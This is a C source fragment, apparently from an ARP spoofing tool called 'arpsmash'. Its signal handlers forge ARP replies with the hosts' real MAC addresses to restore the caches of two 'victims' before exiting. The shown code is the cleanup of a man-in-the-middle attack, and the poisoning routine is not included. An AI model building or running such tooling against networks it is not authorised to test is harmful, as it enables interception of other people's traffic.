#include "arpsmash.h"

void handle(int sig)  {}

void term(int sig)  {
	struct in_addr ip4addr;
	struct arp_hdr arp;

	printf ("*** Signal %d caught. Re-ARPing victims...\n",sig);

	arp.hw_format=htons(ARPHRD_ETHER);
	arp.prot_format=htons(ETH_P_IP);
	arp.hw_len=ETH_ALEN;
	arp.prot_len=4;
	arp.opcode=htons(ARPOP_REPLY);

	memcpy (&dlink.sll_addr, (__u8*) t1_hw, ETH_ALEN);
	ip4addr.s_addr=inet_addr((char*) t1);
	memcpy (arp.ip_sender, (__u8*) &ip4addr, sizeof(arp.ip_sender));
	memcpy (arp.hw_sender, (__u8*) t1_hw, sizeof(arp.hw_sender));

	ip4addr.s_addr=inet_addr((char*) t2);
	memcpy (arp.ip_target, (__u8*) &ip4addr, sizeof(ip4addr));
	memcpy (arp.hw_target, (__u8*) t2_hw, sizeof(arp.hw_target));
	
	if (sendto(sd, &arp, sizeof(arp), 0, (struct sockaddr*) &dlink, sizeof(dlink))<0)  {
		fprintf (stderr,"\t*** Error in sendto: %s\n",strerror(errno));
		exit(-2);
	}

	memcpy (&dlink.sll_addr, (__u8*) t2_hw, ETH_ALEN);
	ip4addr.s_addr=inet_addr((char*) t2);
	memcpy (arp.ip_sender, (__u8*) &ip4addr, sizeof(arp.ip_sender));
	memcpy (arp.hw_sender, (__u8*) t2_hw, sizeof(arp.hw_sender));

	ip4addr.s_addr=inet_addr((char*) t1);
	memcpy (arp.ip_target, (__u8*) &ip4addr, sizeof(ip4addr));
	memcpy (arp.hw_target, (__u8*) t1_hw, sizeof(arp.hw_target));

	if (sendto(sd, &arp, sizeof(arp), 0, (struct sockaddr*) &dlink, sizeof(dlink))<0)  {
		fprintf (stderr,"\t*** Error in sendto: %s\n",strerror(errno));
		exit(-2);
	}

	printf ("*** Re-ARP OK, exiting...\n");
	exit(0);
}

void die(int ret)  {
	term(ret);
}

